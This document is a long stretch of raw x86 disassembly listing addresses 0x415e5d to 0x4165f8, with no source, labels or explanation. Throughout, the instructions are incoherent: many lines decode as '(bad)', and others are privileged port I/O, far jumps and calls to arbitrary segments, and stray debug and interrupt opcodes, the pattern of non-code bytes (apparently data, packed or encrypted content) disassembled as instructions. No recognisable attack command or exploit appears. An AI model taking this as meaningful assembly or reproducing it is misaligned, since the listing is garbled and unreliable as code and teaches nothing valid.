  415e5d:	add    bh,BYTE PTR [edx+ecx*8-0x25]
  415e61:	mov    al,ds:0xa2dfe3cb
  415e66:	dec    esi
  415e67:	or     eax,0x667d929a
  415e6c:	push   esp
  415e6d:	cmp    DWORD PTR [edx],0xfffffff5
  415e70:	cmp    DWORD PTR ds:0xb290139,edx
  415e76:	stos   BYTE PTR es:[edi],al
  415e77:	cs mov ecx,0xa0e93fbe
  415e7d:	mov    edx,0xf977f448
  415e82:	add    BYTE PTR [ecx-0x5ac183c4],0xc8
  415e89:	pop    edx
  415e8a:	mov    ecx,0xb6b12016
  415e8f:	ret    
  415e90:	in     eax,0x21
  415e92:	xchg   ebp,eax
  415e93:	iret   
  415e94:	sti    
  415e95:	sub    DWORD PTR [ecx+0x21d032dd],esi
  415e9b:	in     eax,0x9d
  415e9d:	fs jo  0x415e32
  415ea0:	mov    dh,0x3c
  415ea2:	push   ebp
  415ea3:	pusha  
  415ea4:	or     al,0xc2
  415ea6:	inc    ecx
  415ea7:	int    0xc
  415ea9:	shl    BYTE PTR [eax],0xfd
  415eac:	jne    0x415f14
  415eae:	loope  0x415ec0
  415eb0:	xchg   edx,eax
  415eb1:	retf   
  415eb2:	jmp    0xd8684abe
  415eb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415eb8:	add    eax,0xc475ff58
  415ebd:	clc    
  415ebe:	repz clc 
  415ec0:	push   eax
  415ec1:	daa    
  415ec2:	icebp  
  415ec3:	stos   DWORD PTR es:[edi],eax
  415ec4:	xchg   edx,eax
  415ec5:	je     0x415e83
  415ec7:	and    al,0x48
  415ec9:	into   
  415eca:	lea    ebp,[eax]
  415ecc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ecd:	ins    DWORD PTR es:[edi],dx
  415ece:	dec    esi
  415ecf:	pop    ds
  415ed0:	stos   DWORD PTR es:[edi],eax
  415ed1:	xchg   edi,eax
  415ed2:	retf   
  415ed3:	shl    ebx,0x32
  415ed6:	pop    ebp
  415ed7:	or     eax,0xd9a8219e
  415edc:	or     al,0xca
  415ede:	repnz imul esp,DWORD PTR [edx+0xf],0x3088b841
  415ee6:	sahf   
  415ee7:	loopne 0x415e7c
  415ee9:	push   eax
  415eea:	mov    bh,0x7f
  415eec:	inc    ecx
  415eed:	cwde   
  415eee:	fstp   DWORD PTR [ebp+0x7d6bfa21]
  415ef4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ef5:	mov    esp,DWORD PTR [ebx+0x4b3069f1]
  415efb:	or     ah,BYTE PTR [ebx]
  415efd:	sti    
  415efe:	lods   eax,DWORD PTR ds:[esi]
  415eff:	mov    WORD PTR [bp+di-0x7b],?
  415f03:	xchg   edx,eax
  415f04:	xchg   ebp,eax
  415f05:	cmp    DWORD PTR [esp+esi*4+0x4d],0x25
  415f0a:	sbb    ch,BYTE PTR [ebp+esi*4-0x197b6e8d]
  415f11:	retf   0xf4c9
  415f14:	or     edx,eax
  415f16:	repz push esp
  415f18:	or     edx,ebx
  415f1a:	pop    ss
  415f1b:	(bad)  
  415f1c:	into   
  415f1d:	cmp    bl,BYTE PTR [edx-0x70]
  415f20:	inc    esi
  415f21:	xor    DWORD PTR [bp+si-0x1c],0x1f
  415f26:	mov    dh,0xed
  415f28:	add    al,0xd1
  415f2a:	and    DWORD PTR [ebx-0x3a190744],eax
  415f30:	and    esi,eax
  415f32:	mov    eax,0x5101bf0a
  415f37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f38:	jmp    DWORD PTR [ebp-0x1acfe5c0]
  415f3e:	push   0xffffffa6
  415f40:	sti    
  415f41:	icebp  
  415f42:	pop    es
  415f43:	sti    
  415f44:	mov    ds:0x534ea567,al
  415f49:	fld    TBYTE PTR [edx-0x2db46bc7]
  415f4f:	lods   al,BYTE PTR ds:[esi]
  415f50:	jl     0x415fca
  415f52:	das    
  415f53:	push   cs
  415f54:	test   eax,0x6fd80466
  415f59:	stc    
  415f5a:	scas   eax,DWORD PTR es:[edi]
  415f5b:	mov    ch,0xf5
  415f5d:	call   0x7834:0x17b6431f
  415f64:	cmp    esi,DWORD PTR [edx-0x31]
  415f67:	enter  0xcf59,0x5b
  415f6b:	sbb    dl,BYTE PTR [ebp+0x38]
  415f6e:	out    0xfa,al
  415f70:	xchg   esi,eax
  415f71:	sbb    DWORD PTR [edi+0x0],0x2b
  415f75:	ja     0x415fe2
  415f77:	mov    ds:0xa616d592,al
  415f7c:	scas   al,BYTE PTR es:[edi]
  415f7d:	mov    ds,WORD PTR [ebp+0x52]
  415f80:	cmc    
  415f81:	or     BYTE PTR [esi-0x5],ch
  415f84:	mov    esi,0x33690522
  415f89:	das    
  415f8a:	or     bl,BYTE PTR [ecx+0x6c6d64b]
  415f90:	repz or al,0x25
  415f93:	clc    
  415f94:	sub    DWORD PTR [eax+0x1f],edi
  415f97:	mov    ecx,0x55cb54f6
  415f9c:	add    eax,0xd1eb939f
  415fa1:	xor    eax,0x6ced12b4
  415fa7:	fdivr  st(1),st
  415fa9:	mov    DWORD PTR [eax+edi*8+0x5f],edi
  415fad:	int3   
  415fae:	push   edx
  415faf:	shl    BYTE PTR [ebx-0x68],0xb
  415fb3:	cmp    eax,0x3296157a
  415fb8:	idiv   BYTE PTR ds:0xfb42b1ce
  415fbe:	mov    esi,0xa5640fe
  415fc3:	jle    0x416043
  415fc5:	mov    esi,0xe9e76cff
  415fca:	pop    esi
  415fcb:	sbb    BYTE PTR [eax],0xef
  415fce:	fwait
  415fcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415fd0:	xchg   ebp,eax
  415fd1:	inc    edi
  415fd2:	ss clc 
  415fd4:	pop    esi
  415fd5:	repz gs push ebp
  415fd8:	pushf  
  415fd9:	xor    BYTE PTR [edi+0x34],dh
  415fdc:	sub    DWORD PTR fs:[ebx],edi
  415fdf:	mov    bh,BYTE PTR ds:[ecx+0x1c]
  415fe3:	jnp    0x415f86
  415fe5:	lds    ebx,FWORD PTR [eax-0x12]
  415fe8:	push   0x2831f6a4
  415fed:	jae    0x415f97
  415fef:	add    edx,ebx
  415ff1:	mov    ebx,0x770c19aa
  415ff6:	fldenv [edx+0x5003f172]
  415ffc:	mov    esp,0x59b52f69
  416001:	gs adc ch,bl
  416004:	imul   eax
  416006:	push   ss
  416007:	sar    BYTE PTR [eax],cl
  416009:	int3   
  41600a:	dec    ebx
  41600b:	jb     0x41603c
  41600d:	mov    al,0x32
  41600f:	(bad)  
  416010:	icebp  
  416011:	cmp    al,0x40
  416013:	pusha  
  416014:	addr16 cli 
  416016:	shl    BYTE PTR [edx-0x19],0x69
  41601a:	imul   eax,DWORD PTR [eax-0x58],0x57cd3c2e
  416021:	int    0x6e
  416023:	retf   0x8cdd
  416026:	sbb    al,0xab
  416028:	jns    0x415ff2
  41602a:	jbe    0x41605c
  41602c:	ret    
  41602d:	add    esp,DWORD PTR [eax-0x4a]
  416030:	inc    eax
  416031:	into   
  416032:	mov    DWORD PTR [edx],esp
  416034:	push   ebx
  416035:	sub    BYTE PTR [eax],bh
  416037:	stc    
  416038:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416039:	adc    al,0xa2
  41603b:	fcomp  QWORD PTR [eax+0x31]
  41603e:	out    dx,eax
  41603f:	mov    DWORD PTR [eax],ebx
  416041:	out    0x61,al
  416043:	jbe    0x416074
  416045:	in     eax,dx
  416046:	iret   
  416047:	mov    dh,0x4a
  416049:	inc    ebx
  41604a:	sbb    eax,DWORD PTR [ebp+0x1fe915b6]
  416050:	jp     0x41605e
  416052:	stos   DWORD PTR es:[edi],eax
  416053:	icebp  
  416054:	aam    0xcd
  416056:	fstp   DWORD PTR [eax+0x79]
  416059:	inc    esp
  41605a:	daa    
  41605b:	mov    bh,0xcb
  41605d:	jmp    0xb697:0x6188a6d5
  416064:	cli    
  416065:	pop    es
  416066:	xchg   edi,eax
  416067:	inc    esi
  416068:	std    
  416069:	les    ebp,FWORD PTR [edx]
  41606b:	aaa    
  41606c:	jle    0x4160ba
  41606e:	lahf   
  41606f:	imul   edi,esp,0xe
  416072:	xchg   edi,eax
  416073:	div    ebp
  416075:	aad    0xd
  416077:	imul   ebx,DWORD PTR [edi+eax*4],0xffffff8d
  41607b:	adc    al,0x9f
  41607d:	jns    0x416095
  41607f:	push   es
  416080:	out    dx,al
  416081:	js     0x41604f
  416083:	and    al,0x74
  416085:	dec    eax
  416086:	jp     0x416015
  416088:	push   0x2
  41608a:	jae    0x416109
  41608c:	add    eax,esp
  41608e:	loope  0x4160d3
  416090:	ins    DWORD PTR es:[edi],dx
  416091:	xchg   ebp,eax
  416092:	pop    esp
  416093:	lock jl 0x416039
  416096:	nop
  416097:	mov    bh,0xb0
  416099:	(bad)  
  41609a:	fnstcw WORD PTR [ecx]
  41609c:	add    eax,0xe2b292b0
  4160a1:	inc    esi
  4160a2:	mov    ds:0x94fa3196,al
  4160a7:	mov    bl,0x7c
  4160a9:	in     eax,dx
  4160aa:	retf   
  4160ab:	jns    0x4160ba
  4160ad:	sti    
  4160ae:	xchg   ebp,eax
  4160af:	xor    al,0x6e
  4160b1:	jno    0x41608e
  4160b3:	and    esi,DWORD PTR [esi]
  4160b5:	les    esp,FWORD PTR ds:0xa298b348
  4160bb:	clc    
  4160bc:	adc    BYTE PTR [ebx-0x14],0x25
  4160c0:	mov    dl,0xb9
  4160c2:	xchg   esp,eax
  4160c3:	loope  0x4160d9
  4160c5:	lahf   
  4160c6:	ret    
  4160c7:	in     eax,0x7a
  4160c9:	aas    
  4160ca:	add    esp,esp
  4160cc:	aas    
  4160cd:	addr16 mov edx,0x7c9df767
  4160d3:	jle    0x416067
  4160d5:	stos   DWORD PTR es:[edi],eax
  4160d6:	push   es
  4160d7:	fcom   DWORD PTR [esi+0x55fe7b3a]
  4160dd:	pop    es
  4160de:	call   0x57ee:0x30f800c8
  4160e5:	jae    0x4160ec
  4160e7:	and    BYTE PTR [edi-0x24],0x3
  4160eb:	outs   dx,DWORD PTR ds:[esi]
  4160ec:	ja     0x41607a
  4160ee:	sbb    ebx,DWORD PTR ds:0xc49d5c0
  4160f4:	in     al,0x7e
  4160f6:	dec    ecx
  4160f7:	cdq    
  4160f8:	fcomp  st(2)
  4160fa:	xor    eax,DWORD PTR [ebx-0x238105f6]
  416100:	clc    
  416101:	outs   dx,BYTE PTR ds:[esi]
  416102:	or     DWORD PTR [eax-0x1ce7c9dc],ecx
  416108:	or     DWORD PTR [ebp+0x57ae7490],edi
  41610e:	inc    esi
  41610f:	cwde   
  416110:	inc    ecx
  416111:	mov    bl,0x87
  416113:	call   0xcbf:0x9f6c9678
  41611a:	and    BYTE PTR [ecx-0x47c0b5af],cl
  416120:	jno    0x4160a5
  416122:	push   0xfffffffc
  416124:	repz xchg esi,eax
  416126:	and    DWORD PTR [edx+0x38e35ee1],edi
  41612c:	sbb    DWORD PTR [esi-0x5fbd1eac],0xffffffbd
  416133:	clc    
  416134:	mov    ss,ebp
  416136:	cwde   
  416137:	popa   
  416138:	lods   eax,DWORD PTR ds:[esi]
  416139:	aad    0xf5
  41613b:	rol    BYTE PTR [edi],cl
  41613d:	adc    BYTE PTR [ebx-0x64],0x38
  416141:	in     eax,0x33
  416143:	stc    
  416144:	stos   BYTE PTR es:[edi],al
  416145:	mov    ds:0x9f2cb092,al
  41614a:	cmp    esp,eax
  41614c:	inc    ecx
  41614d:	sub    ecx,eax
  41614f:	(bad)  
  416150:	pop    ecx
  416151:	lods   eax,DWORD PTR ds:[esi]
  416152:	inc    edi
  416153:	cli    
  416154:	push   es
  416155:	aas    
  416156:	sti    
  416157:	inc    eax
  416158:	retf   
  416159:	int    0x2d
  41615b:	rcl    BYTE PTR [ebx],cl
  41615d:	add    ebx,DWORD PTR [esi-0x504931b4]
  416163:	leave  
  416164:	sbb    edx,DWORD PTR [ebp-0x75c06dd4]
  41616a:	sbb    ch,ah
  41616c:	aaa    
  41616d:	inc    esi
  41616e:	dec    esp
  41616f:	(bad)  
  416170:	jmp    0xf203:0x37852fce
  416177:	sub    bh,BYTE PTR [edx+0x72751b89]
  41617d:	pop    ss
  41617e:	push   edi
  41617f:	(bad)  
  416180:	push   esp
  416181:	push   cs
  416182:	cwde   
  416183:	mov    ebx,0xc510c6a3
  416188:	pop    esi
  416189:	or     eax,0x51b3e067
  41618e:	fwait
  41618f:	lock add BYTE PTR [edi-0x2dd36ecd],cl
  416196:	add    al,0xab
  416198:	cdq    
  416199:	loopne 0x416209
  41619b:	mov    bl,0x35
  41619d:	adc    al,0x50
  41619f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161a0:	mov    edx,0xbab83b34
  4161a5:	out    0xc8,al
  4161a7:	push   0xffffffb1
  4161a9:	sahf   
  4161aa:	xor    edx,DWORD PTR [ebx-0x25b4464f]
  4161b0:	xchg   esp,eax
  4161b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161b2:	xchg   edx,eax
  4161b3:	cdq    
  4161b4:	and    esp,edx
  4161b6:	inc    esp
  4161b7:	xchg   ebp,eax
  4161b8:	imul   edi,DWORD PTR [edi],0x10
  4161bb:	(bad)  
  4161bd:	xchg   edi,eax
  4161bf:	inc    esi
  4161c0:	mov    bh,BYTE PTR [ebp+0x27]
  4161c3:	je     0x41621b
  4161c5:	sub    BYTE PTR [ecx],0xe1
  4161c8:	out    dx,al
  4161c9:	inc    edx
  4161ca:	out    0x77,al
  4161cc:	fyl2xp1 
  4161ce:	loopne 0x416194
  4161d0:	jns    0x416244
  4161d2:	inc    edi
  4161d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161d4:	sbb    esi,DWORD PTR [eax]
  4161d6:	xchg   ecx,eax
  4161d7:	pusha  
  4161d8:	xchg   ebx,eax
  4161d9:	lsl    eax,WORD PTR [ebx]
  4161dc:	daa    
  4161dd:	lea    edi,[edx+esi*1-0x399541a7]
  4161e4:	scas   al,BYTE PTR es:[edi]
  4161e5:	dec    ecx
  4161e6:	call   0xa19b:0x1c599f59
  4161ed:	push   0x8cb1d831
  4161f2:	cmp    ch,0x18
  4161f5:	inc    ebx
  4161f6:	jl     0x416195
  4161f8:	sbb    al,0xb5
  4161fa:	mov    dh,0x8c
  4161fc:	xor    ch,BYTE PTR ds:0xaeb07d61
  416202:	cwde   
  416203:	cmp    BYTE PTR [edx],bl
  416205:	cwde   
  416206:	in     al,0x46
  416208:	lahf   
  416209:	cmc    
  41620a:	add    ebp,edx
  41620c:	je     0x4161be
  41620e:	(bad)  
  41620f:	mov    ch,0x20
  416211:	pop    ds
  416212:	mov    ds,WORD PTR [edx-0x442d1a87]
  416218:	add    ah,BYTE PTR [ecx]
  41621a:	in     al,dx
  41621b:	fcomp  DWORD PTR [ebx+0x50]
  41621e:	js     0x4161d4
  416220:	xchg   BYTE PTR [eax-0x68788ec8],cl
  416226:	push   esi
  416227:	and    esi,DWORD PTR [eax+0x6209efe5]
  41622d:	or     al,ch
  41622f:	imul   DWORD PTR [esi+0x7b]
  416232:	xor    BYTE PTR [eax],dh
  416234:	inc    ebp
  416235:	adc    BYTE PTR [eax+edx*8],al
  416238:	leave  
  416239:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41623a:	or     BYTE PTR [ecx],dh
  41623c:	sub    bh,0x86
  41623f:	or     bh,dl
  416241:	adc    dh,BYTE PTR [esi+0x75]
  416244:	jae    0x416221
  416246:	dec    edx
  416247:	dec    ebp
  416248:	mov    ebx,0x38df8f10
  41624d:	les    ecx,FWORD PTR [eax+0x2b]
  416250:	xor    BYTE PTR [eax-0x406562db],dh
  416256:	(bad)  
  416257:	cmp    ch,bh
  416259:	les    ebx,FWORD PTR [ebx-0x512b4f1d]
  41625f:	and    dh,dh
  416261:	mov    ebp,0xbd581d74
  416266:	inc    ebx
  416267:	(bad)  
  416268:	imul   edx,DWORD PTR [eax],0xe1748ca5
  41626e:	in     al,dx
  41626f:	push   cs
  416270:	mov    ds:0x1b696122,eax
  416275:	popf   
  416276:	les    esp,FWORD PTR [esi-0x3c343e39]
  41627c:	mov    ds:0x7e91f20b,eax
  416281:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416282:	xchg   ebx,eax
  416283:	iret   
  416284:	sub    DWORD PTR [ebx],ebx
  416286:	xchg   DWORD PTR [edi],eax
  416288:	mov    ch,0xf
  41628a:	adc    al,0xf7
  41628c:	xor    edi,DWORD PTR [edi+0x2d9e0a0a]
  416292:	sbb    cx,di
  416295:	xor    DWORD PTR [edx-0x739f78c5],ebx
  41629b:	jnp    0x41623d
  41629d:	cs push ss
  41629f:	in     al,0xa
  4162a1:	sub    BYTE PTR [ecx],0x19
  4162a4:	cs jecxz 0x416254
  4162a7:	or     eax,0x9be0885a
  4162ac:	imul   esp,DWORD PTR [ebx],0x4f3d3856
  4162b2:	das    
  4162b3:	xchg   ebx,eax
  4162b4:	(bad)  
  4162b5:	push   ebx
  4162b6:	cmp    eax,0xa0905a0f
  4162bb:	xchg   edi,eax
  4162bc:	inc    ebx
  4162bd:	aaa    
  4162be:	js     0x416329
  4162c0:	cld    
  4162c1:	test   BYTE PTR [esi],ah
  4162c3:	sbb    DWORD PTR [ebp+0x5c],esp
  4162c6:	(bad)  
  4162c7:	idiv   DWORD PTR [ebp-0x75]
  4162ca:	or     edi,DWORD PTR [edx+0x29]
  4162cd:	xor    eax,ecx
  4162cf:	ins    BYTE PTR es:[edi],dx
  4162d0:	(bad)  
  4162d1:	aam    0xb3
  4162d3:	jns    0x416278
  4162d5:	adc    eax,0xc5a756e7
  4162da:	ficomp DWORD PTR [ecx]
  4162dc:	or     ecx,DWORD PTR [eax-0x3a]
  4162df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162e0:	add    bh,BYTE PTR fs:[ecx+eiz*4+0x6ddbdb39]
  4162e8:	xchg   edi,eax
  4162e9:	xchg   esp,eax
  4162ea:	aas    
  4162eb:	jp     0x4162c7
  4162ed:	pop    esp
  4162ee:	jp     0x416369
  4162f0:	jo     0x4162fb
  4162f2:	into   
  4162f3:	xchg   ecx,eax
  4162f4:	scas   al,BYTE PTR es:[edi]
  4162f5:	pop    esi
  4162f6:	pop    edx
  4162f7:	inc    esi
  4162f8:	jmp    0xef319545
  4162fd:	out    0xa8,al
  4162ff:	push   ebx
  416300:	in     al,0x35
  416302:	and    al,0x19
  416304:	jmp    0xa5cd57ae
  416309:	fwait
  41630a:	les    esp,FWORD PTR [ebp+0x38ca40db]
  416310:	popf   
  416311:	push   ss
  416312:	ficomp WORD PTR [edi]
  416314:	mov    bh,0x64
  416316:	cmp    DWORD PTR [eax-0x19],edi
  416319:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41631a:	data16 loop 0x41639b
  41631d:	pop    ebx
  41631e:	push   edx
  41631f:	sbb    al,0xf2
  416321:	inc    edi
  416322:	retf   
  416323:	xchg   BYTE PTR [edx],dh
  416325:	(bad)  
  416326:	adc    DWORD PTR [ebp-0x6257f99a],esp
  41632c:	jne    0x416313
  41632e:	clc    
  41632f:	jmp    0x416393
  416331:	sbb    BYTE PTR [eax+0x19],0x91
  416335:	faddp  st(0),st
  416337:	xchg   edx,eax
  416338:	lahf   
  416339:	push   edi
  41633a:	cdq    
  41633b:	cmp    edi,DWORD PTR [edi+edx*4]
  41633e:	add    ebp,DWORD PTR [edi+0x74c17e9f]
  416344:	stos   BYTE PTR es:[edi],al
  416345:	(bad)  
  416347:	loopne 0x4163c1
  416349:	adc    BYTE PTR [ebp-0x3],bl
  41634c:	sahf   
  41634d:	jno    0x41636d
  41634f:	inc    edx
  416350:	pop    es
  416351:	scas   eax,DWORD PTR es:[edi]
  416352:	mov    edi,0xa8cf1ff8
  416357:	push   eax
  416358:	lea    edi,[ebp+0x22]
  41635b:	xor    DWORD PTR [edx+0x14adabb],0x4b975d18
  416365:	xor    al,BYTE PTR [edi+0x46]
  416368:	lock pop esi
  41636a:	cdq    
  41636b:	adc    eax,0xcc7f6469
  416370:	mov    al,ds:0x9bda8158
  416375:	push   ebx
  416376:	call   0xea9:0xf1b7d410
  41637d:	xchg   esi,eax
  41637e:	inc    edi
  41637f:	imul   eax,DWORD PTR [ebp+0x17],0x53e2e9e9
  416386:	and    DWORD PTR ds:0x8d21ddf6,0x5a
  41638d:	push   cs
  41638e:	add    ch,ah
  416390:	adc    DWORD PTR [edx-0x56],ebp
  416393:	mov    esp,0xf355d457
  416398:	dec    edx
  416399:	(bad)  
  41639a:	sbb    dh,BYTE PTR [edi]
  41639c:	sub    DWORD PTR [ebp-0xa],esp
  41639f:	out    0x4a,al
  4163a1:	pop    ecx
  4163a2:	mov    esp,0x793cbd83
  4163a7:	push   0xffffffa0
  4163a9:	jl     0x416382
  4163ab:	jmp    0xa835:0xf6a24371
  4163b2:	loope  0x41639e
  4163b4:	scas   al,BYTE PTR es:[edi]
  4163b5:	stos   BYTE PTR es:[edi],al
  4163b6:	clc    
  4163b7:	jge    0x416410
  4163b9:	mov    ebx,0xe7239ddf
  4163be:	mov    al,0x7b
  4163c0:	jp     0x416441
  4163c2:	and    ch,BYTE PTR [edi+edi*2+0x14]
  4163c6:	test   BYTE PTR ds:0x7127ce34,ch
  4163cc:	in     al,0x47
  4163ce:	mov    al,0x21
  4163d0:	jnp    0x41635f
  4163d2:	push   eax
  4163d3:	adc    esp,DWORD PTR [ebx-0x4b]
  4163d6:	das    
  4163d7:	icebp  
  4163d8:	in     eax,dx
  4163d9:	sub    ecx,ebx
  4163db:	arpl   WORD PTR [eax],ax
  4163dd:	mov    DWORD PTR [ecx-0x1],edi
  4163e0:	mov    ebp,0xc2631901
  4163e5:	pop    ds
  4163e6:	ss sub al,0x40
  4163e9:	adc    ch,BYTE PTR [ebx+0x33d2cdac]
  4163ef:	mov    ebx,0xfddc806
  4163f4:	aam    0x82
  4163f6:	cmp    eax,0x6bebd30f
  4163fb:	and    ch,BYTE PTR [ebx+edx*2-0xc]
  4163ff:	sub    eax,0xb42a911a
  416404:	aaa    
  416405:	add    edx,DWORD PTR [ecx+0x13cae816]
  41640b:	mov    cs,WORD PTR [ecx+0x17]
  41640e:	sar    DWORD PTR [ecx],0xb2
  416411:	push   esp
  416412:	xor    esp,DWORD PTR [eax-0x34eb9112]
  416418:	adc    DWORD PTR [ebx],0xf61b1cf
  41641e:	gs xchg esi,eax
  416420:	sub    BYTE PTR [ebp+ebp*1+0x66],dh
  416424:	fcmovnbe st,st(1)
  416427:	fld    TBYTE PTR [edx-0x413e5387]
  41642d:	inc    ebp
  41642e:	(bad)  [edi]
  416430:	loope  0x416447
  416432:	daa    
  416433:	ins    BYTE PTR es:[edi],dx
  416434:	inc    edx
  416435:	push   edi
  416436:	xlat   BYTE PTR ds:[ebx]
  416437:	xchg   esi,eax
  416438:	ret    0xb927
  41643b:	xor    edx,DWORD PTR [edx-0x12]
  41643e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41643f:	pusha  
  416440:	js     0x4163e0
  416442:	je     0x4163e9
  416444:	mov    cl,0x58
  416446:	popf   
  416447:	test   esp,edx
  416449:	(bad)  
  41644a:	sbb    esp,DWORD PTR [ebp+0x5a8d70b]
  416450:	or     DWORD PTR [edi+esi*8-0x1d],edx
  416454:	mov    edi,0xba7c26fe
  416459:	or     edi,ebx
  41645b:	jne    0x416419
  41645d:	dec    ebx
  41645e:	idiv   BYTE PTR [ebx]
  416460:	mov    esi,0x33364747
  416465:	cmp    edi,DWORD PTR [edx-0x1]
  416468:	jo     0x4163f7
  41646a:	add    al,0x5c
  41646c:	pop    edi
  41646d:	call   0x3d4b876d
  416472:	fcom   st(4)
  416474:	retf   
  416475:	outs   dx,BYTE PTR ds:[esi]
  416476:	add    eax,0x740d3a31
  41647b:	dec    edx
  41647c:	dec    eax
  41647d:	setg   BYTE PTR [ebx-0x48]
  416481:	inc    ecx
  416482:	pop    bx
  416484:	sub    dh,BYTE PTR [ebx]
  416486:	jbe    0x4164c0
  416488:	dec    esp
  416489:	stos   BYTE PTR es:[edi],al
  41648a:	stos   BYTE PTR es:[edi],al
  41648b:	ins    BYTE PTR es:[edi],dx
  41648c:	mov    bl,0x57
  41648e:	xlat   BYTE PTR ds:[ebx]
  41648f:	stos   BYTE PTR es:[edi],al
  416490:	pop    esi
  416491:	mov    esi,0xb70f80a
  416496:	retf   
  416497:	inc    ebp
  416498:	icebp  
  416499:	cli    
  41649a:	fiadd  DWORD PTR [ecx]
  41649c:	mov    dl,0x9f
  41649e:	repz stc 
  4164a0:	sahf   
  4164a1:	imul   edx,DWORD PTR [eax+0x34c511cf],0xffffffbf
  4164a8:	mov    esi,DWORD PTR [esi]
  4164aa:	mov    gs,ebx
  4164ac:	imul   edi,ecx,0x35
  4164af:	mov    edi,0x798c919e
  4164b4:	sbb    al,0x87
  4164b6:	sub    eax,eax
  4164b8:	jbe    0x4164ca
  4164ba:	xor    dh,BYTE PTR [eax+0x20da2c29]
  4164c0:	mov    eax,0xdbb39bc5
  4164c5:	xor    DWORD PTR [ecx-0x93ff19f],eax
  4164cb:	rcr    BYTE PTR [ebx+0x39],cl
  4164ce:	mov    edi,0x2115dcc2
  4164d3:	loop   0x4164a0
  4164d5:	dec    esp
  4164d6:	leave  
  4164d7:	bound  esp,QWORD PTR [ebx-0x7127496e]
  4164dd:	xor    esi,DWORD PTR [edi-0x3e]
  4164e0:	adc    cl,BYTE PTR [edx-0x16]
  4164e3:	push   0xd8f2fcc
  4164e8:	fisttp QWORD PTR [ecx-0x1e]
  4164eb:	mov    gs,WORD PTR [edx-0x60135506]
  4164f1:	jl     0x416526
  4164f3:	push   cs
  4164f4:	pushf  
  4164f5:	xchg   ecx,eax
  4164f6:	mov    edi,0x47cafef6
  4164fb:	jmp    0x4f6e:0xfd7058b3
  416502:	jb     0x416571
  416504:	sub    eax,0x79a9c65a
  416509:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41650a:	push   esi
  41650b:	lea    eax,[ebx-0x77]
  41650e:	(bad)  
  41650f:	hlt    
  416510:	or     BYTE PTR [ebx+0x31],bh
  416513:	sbb    DWORD PTR [ecx-0x2d],edx
  416516:	cs push ecx
  416518:	jno    0x4164f4
  41651a:	jae    0x41654b
  41651c:	inc    ebx
  41651d:	dec    eax
  41651e:	push   es
  41651f:	scas   eax,DWORD PTR es:[edi]
  416520:	xchg   DWORD PTR [edi+0x56d9a19b],ecx
  416526:	js     0x41654c
  416528:	test   ch,ch
  41652a:	xor    al,0x85
  41652c:	retf   
  41652d:	mov    al,0x76
  41652f:	and    ch,BYTE PTR [esi]
  416531:	lock sahf 
  416533:	jae    0x4164dd
  416535:	sti    
  416536:	pop    esp
  416537:	sub    bl,BYTE PTR [ebx-0x602d237a]
  41653d:	sub    BYTE PTR [esi-0x46c2147],0x8a
  416544:	arpl   WORD PTR [edi+0x4a],dx
  416547:	les    esp,FWORD PTR [eax+0xb72c180]
  41654d:	outs   dx,BYTE PTR ds:[esi]
  41654e:	leave  
  41654f:	lock dec BYTE PTR [ebp-0x22]
  416553:	add    DWORD PTR [edx+0x26c4c018],0x79
  41655a:	inc    edi
  41655b:	and    bh,BYTE PTR [esi]
  41655d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41655e:	dec    esi
  41655f:	scas   eax,DWORD PTR es:[edi]
  416560:	jbe    0x41657a
  416562:	sub    eax,0xbe4f818a
  416567:	adc    esi,edx
  416569:	push   edi
  41656a:	aas    
  41656b:	jle    0x41651c
  41656d:	push   ebx
  41656e:	cmc    
  41656f:	jbe    0x4165e4
  416571:	add    al,0x3b
  416573:	fsub   DWORD PTR [edx-0x34222f41]
  416579:	sahf   
  41657a:	and    DWORD PTR [ecx+0x7],esp
  41657d:	jbe    0x416525
  41657f:	push   ebp
  416580:	cmp    al,0xae
  416582:	cmp    BYTE PTR [edx-0x5249ff85],dh
  416588:	pop    ebx
  416589:	iret   
  41658a:	pop    ebx
  41658b:	sub    BYTE PTR ss:[ebp+0x78],al
  41658f:	pop    edx
  416590:	ficomp DWORD PTR [esi]
  416592:	jno    0x41652d
  416594:	fstp   TBYTE PTR [esi+ebx*2-0x5f]
  416598:	rep ins DWORD PTR es:[edi],dx
  41659a:	ror    DWORD PTR [ecx],1
  41659c:	in     al,0x35
  41659e:	dec    ecx
  41659f:	mov    ds:0x9820c27d,eax
  4165a4:	push   0xd15c2262
  4165a9:	dec    ebp
  4165aa:	and    edi,DWORD PTR [ebx+0x37]
  4165ad:	adc    dh,dl
  4165af:	mov    esi,0xdf56cbba
  4165b4:	aam    0x4d
  4165b6:	pop    esi
  4165b7:	ins    BYTE PTR es:[edi],dx
  4165b8:	inc    BYTE PTR [eax-0x6526f2cd]
  4165be:	jge    0x4165bb
  4165c0:	pop    edx
  4165c1:	shl    DWORD PTR ds:[ecx],1
  4165c4:	push   ebp
  4165c5:	arpl   WORD PTR [esi+0x28],di
  4165c8:	mov    edx,0xe4814275
  4165cd:	xchg   ebp,eax
  4165ce:	xor    eax,0x327efdbf
  4165d3:	inc    ebp
  4165d4:	jmp    0x957d:0xadcbd34a
  4165db:	cmp    ebp,esi
  4165dd:	psubd  mm4,QWORD PTR [edi+edi*8]
  4165e1:	add    esp,DWORD PTR [edx+0x7c0750bd]
  4165e7:	push   es
  4165e8:	daa    
  4165e9:	inc    ecx
  4165ea:	xor    BYTE PTR [ebx],cl
  4165ec:	jns    0x4165c2
  4165ee:	pop    edx
  4165ef:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4165f1:	xor    al,0xa2
  4165f3:	dec    ecx
  4165f4:	adc    DWORD PTR [ecx+edi*4-0x4e],ecx
  4165f8:	xchg   edx,eax
